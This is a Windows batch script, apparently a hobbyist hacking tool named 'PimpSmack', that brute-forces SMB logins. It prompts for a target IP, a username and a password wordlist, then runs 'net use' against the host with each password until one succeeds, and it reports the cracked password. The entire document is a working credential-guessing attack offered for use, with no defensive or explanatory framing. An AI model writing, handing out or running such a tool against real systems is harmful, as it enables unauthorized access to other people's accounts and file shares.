@echo off
title PimpSmack - A SMB Bruteforce Tool

:: Set console color to white text on black background
color 07

:: Define functions to change colors
call :setColor A 0A :: Light Green for headers
call :setColor B 0B :: Light Aqua for prompts
call :setColor C 0C :: Light Red for errors
call :setColor D 0D :: Light Purple (Pink) for success messages

:: Header
echo #####################################
echo #   PimpSmack SMB BruteForce Tool   #
echo # ----------------------------------#
echo #     version 1   #   by nUk        #
echo #####################################

:: Reset to default white on black
color 07
echo.
setlocal enabledelayedexpansion

:: User input prompts
call :setColor B 0B
set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p wordlist="Enter Password List: "

:: Reset to default white on black
color 07
set /a count=1
for /f %%a in (%wordlist%) do (
  set "pass=%%a"
  call :attempt
  if !err! EQU 0 goto success
)
call :setColor C 0C
echo Password not Found :(
pause
exit

:success
call :setColor D 0D
echo.
echo Password Found! !pass!
net use \\%ip% /d /y >nul 2>&1
pause
exit

:attempt
call :setColor A 0A
echo Trying password: !pass!
net use \\%ip% /user:%user% !pass! >nul 2>&1
set err=!errorlevel!
echo [ATTEMPT !count!] [!pass!] [Error Level: !err!]
set /a count+=1
goto :eof

:: Function to set console color
:setColor
color %2
goto :eof
